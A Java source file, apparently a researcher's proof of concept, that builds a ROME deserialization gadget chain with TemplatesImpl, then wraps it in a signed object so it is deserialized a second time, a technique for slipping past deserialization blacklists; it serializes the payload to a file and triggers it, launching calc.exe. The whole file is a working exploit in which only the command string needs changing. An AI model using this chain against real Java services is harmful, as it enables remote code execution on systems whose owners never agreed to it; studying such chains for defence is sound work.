package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

import static Seri.Utils.*;

// https://tttang.com/archive/1701/
public class TwiceUnserialize {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc.exe");

        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
        ToStringBean fakeToStringBean = new ToStringBean(Templates.class,new TemplatesImpl());

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        ObjectBean objectBean = new ObjectBean(ToStringBean.class ,fakeToStringBean);
        setValue(objectBean,"_equalsBean",equalsBean);

        HashMap map = new HashMap();
        map.put(objectBean,123);

        // 生成公钥
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        SignedObject signedObject = new SignedObject(
                map,
                keyPair.getPrivate(),
                Signature.getInstance("DSA")
        );

        // 调用SignedObject中的 getter ,getObject();
        ToStringBean finalToStringBean = new ToStringBean(SignedObject.class,signedObject);
        EqualsBean finalEqualBean = new EqualsBean(ToStringBean.class ,finalToStringBean);
        HashMap finalMap = new HashMap();
        finalMap.put(finalEqualBean,"123");

        serialize(finalMap ,"bin/TwiceUnserialize.bin");
        unserialize("bin/TwiceUnserialize.bin");

    }
}
